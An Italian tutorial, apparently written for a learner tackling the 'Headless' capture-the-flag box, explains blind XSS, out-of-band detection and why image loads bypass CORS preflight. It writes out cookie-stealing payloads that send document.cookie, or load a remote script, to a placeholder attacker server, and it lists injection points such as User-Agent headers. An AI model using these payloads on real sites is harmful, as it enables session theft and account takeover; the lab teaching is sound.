Ottima scelta per imparare — Headless è un buon box per consolidare il concetto.

## Cos'è il Blind XSS

Il **Blind XSS** è una variante del **Stored [[XSS]]** in cui il payload viene eseguito in un contesto che **l'attaccante non può vedere direttamente**.

Il flusso tipico è questo:

1. L'attaccante inietta un payload in un campo (form, header HTTP, user-agent, ecc.)
2. Il payload viene **salvato lato server** (database, log, sistema di ticketing…)
3. Il payload viene **renderizzato in un secondo momento**, in un pannello admin, una dashboard, un tool interno — qualcosa a cui l'attaccante non ha accesso diretto
4. Il browser della **vittima** (spesso un admin) esegue il JavaScript

La parola _blind_ sta proprio lì: non vedi l'output, non sai se il payload è scattato. Devi **fartelo dire** dalla macchina della vittima.

## Come si capisce se è scattato

Siccome non hai feedback diretto, il payload classico fa una **richiesta out-of-band** verso un server che controlli tu:

```javascript
<script>
  new Image().src = "http://TUO-SERVER/?c=" + document.cookie;
</script>
```

oppure carica uno script esterno:

```javascript
<script src="http://TUO-SERVER/payload.js"></script>
```

Quando il browser della vittima esegue il codice, il tuo server riceve la richiesta — e **sai che il payload è scattato**, e cosa ha esfiltrato.

## Perché funziona così bene Image

Perché sfrutta una caratteristica fondamentale di come il browser carica le immagini, e questa gli dà tre vantaggi che gli altri metodi non hanno tutti insieme.

### Cosa succede tecnicamente

```javascript
new Image().src = "http://LISTENER/?c=" + document.cookie;
```

`new Image()` crea un oggetto `HTMLImageElement` in memoria (equivalente a un tag `<img>`, ma senza inserirlo nel DOM). Nel momento esatto in cui assegni la proprietà `.src`, il browser **parte automaticamente con una GET** verso quell'URL per scaricare l'immagine — esattamente come farebbe per un `<img>` in una pagina.

A quel punto i dati che hai concatenato nell'URL (`?c=...`) sono già arrivati al tuo server, dentro la request. Non importa che la "immagine" non esista: il server riceve comunque la GET con i dati, e questo è tutto ciò che serve.

### I tre vantaggi

**1. Bypassa la Same-Origin Policy / CORS** Le immagini sono una risorsa che il browser è progettato per caricare da **qualsiasi dominio** — è normale che una pagina mostri immagini esterne. Quindi una GET verso un dominio diverso (cross-origin) non viene bloccata. Con `fetch()` invece scatterebbe il controllo CORS: il browser farebbe la request ma ti **negherebbe la lettura della risposta**, e a seconda dei casi potrebbe bloccarla del tutto. Per esfiltrare a te questo non conta — a te interessa solo che la request _parta_, non leggere la risposta — ma `Image` non incontra nemmeno l'ostacolo.

**2. Non ti serve la risposta** L'obiettivo è far uscire i dati nell'URL, non ricevere qualcosa indietro. `Image` è "fire and forget": manda la GET e tu non devi gestire promesse, callback, o parsing. Il dato è già nell'URL della request stessa.

**3. È cortissimo e robusto** Una riga, nessuna dipendenza, niente `async/await`, niente costruzione manuale della request. Funziona anche in contesti dove lo spazio per il payload è limitato (un campo corto, un header). Ed è vecchio quanto il web: funziona su qualsiasi browser, anche datato.

### Il punto concettuale

`new Image()` funziona così bene perché **non sta "facendo una request HTTP" agli occhi del browser** — sta caricando un'immagine, un'operazione considerata innocua e quindi non soggetta alle restrizioni cross-origin pensate per le richieste dati. È un canale laterale: usi un meccanismo legittimo (caricamento risorse) per uno scopo diverso (esfiltrazione).

Lo stesso trucco funziona con altri tag che caricano risorse esterne senza restrizioni cross-origin — `<script>`, `<link>`, `<iframe>` — ma `Image` è il più pulito perché non altera la pagina visibile e non esegue nulla lato vittima oltre la GET.

## Image a livello [[HTTP]]

A livello HTTP è una singola richiesta GET, identica a qualsiasi caricamento di immagine. Vediamola.

### La request che parte

Quando assegni `.src`, il browser apre una connessione TCP verso `LISTENER` (se non già aperta) e manda qualcosa del genere:

```http
GET /?c=session=abc123;%20user=admin HTTP/1.1
Host: LISTENER
Connection: keep-alive
User-Agent: Mozilla/5.0 (...) [browser della VITTIMA]
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://target:5000/pagina-vulnerabile
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9
```

I punti interessanti per te che ricevi:

- **La request line** contiene i dati esfiltrati nella query string (`?c=...`). Sono già tuoi, qui.
- **`Accept: image/...`** → è la firma che rivela che la GET nasce da un contesto immagine. Il browser dichiara che si aspetta un'immagine.
- **`Referer`** → spesso rivela **l'URL della pagina dove il payload è scattato** — informazione preziosa nel blind XSS, perché ti dice _dove_ ha funzionato (es. la pagina admin dei log).
- **`User-Agent`** → è quello del browser della **vittima**, non il tuo.
- **Niente `Origin` header** in una GET di immagine semplice, e nessun preflight (vedi sotto).

### Perché non c'è preflight CORS

Questo è il cuore della questione a livello HTTP.

Con `fetch()` cross-origin, per certe request il browser manda **prima** una request `OPTIONS` di preflight per chiedere il permesso al server:

```http
OPTIONS /?c=... HTTP/1.1
Origin: http://target:5000
Access-Control-Request-Method: GET
```

…e procede solo se il server risponde con gli header `Access-Control-Allow-*` giusti.

Il caricamento di un'immagine **non è soggetto a questo meccanismo**. È una "simple request" di tipo risorsa: il browser la considera un caricamento passivo, manda direttamente la GET senza preflight e senza chiedere permesso a nessuno. La SOP regola la _lettura della risposta_, non l'_invio della request_ per le risorse incorporabili come le immagini.

### La response (che ignori)

Il tuo server può rispondere qualsiasi cosa:

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 2

ok
```

Il browser della vittima proverà a interpretare il body come immagine, fallirà (non è un'immagine valida), e scatterà silenziosamente l'evento `onerror` dell'oggetto `Image`. **A te non importa**: la response non torna mai al JavaScript dell'attaccante in modo utile, e comunque l'obiettivo — far arrivare i dati nella request — è già stato raggiunto nel momento in cui la GET è partita.

### In sintesi

A livello HTTP non c'è nulla di speciale o malevolo nei pacchetti: è una GET perfettamente legittima verso un server, indistinguibile dal caricamento di una vera immagine. L'intero "attacco" sta nel fatto che la query string trasporta dati rubati e che il browser ha eseguito quel JS senza che la vittima lo sapesse. Il protocollo fa esattamente il suo lavoro — è il _contesto_ a essere malevolo.

## Differenza con XSS Reflected e Stored "classico"

| |Reflected|Stored classico|**Blind XSS**|
|---|---|---|---|
|Dove vive il payload|Solo nell'URL/request|DB, visibile all'attaccante|DB, **contesto separato**|
|Chi lo esegue|L'attaccante stesso|Chiunque visiti la pagina|Un utente privilegiato in area non pubblica|
|Feedback immediato|Sì|Sì|**No**|

## Dove si trova in pratica

I punti di iniezione tipici per blind XSS sono campi che finiscono in **aree admin o di logging**:

- Form di supporto / feedback
- Campi `User-Agent`, `X-Forwarded-For`, `Referer` nelle request HTTP (finiscono nei log visualizzati dagli admin)
- Sistemi di ticketing interni
- Campi nome/cognome in registrazioni

---

Con questo in testa, quando esplori Headless pensa a: _quali input accetta l'applicazione? Quali di questi potrebbero essere letti da qualcuno in un contesto diverso dal mio?_ Quella è la domanda da farti prima di iniettare qualsiasi cosa.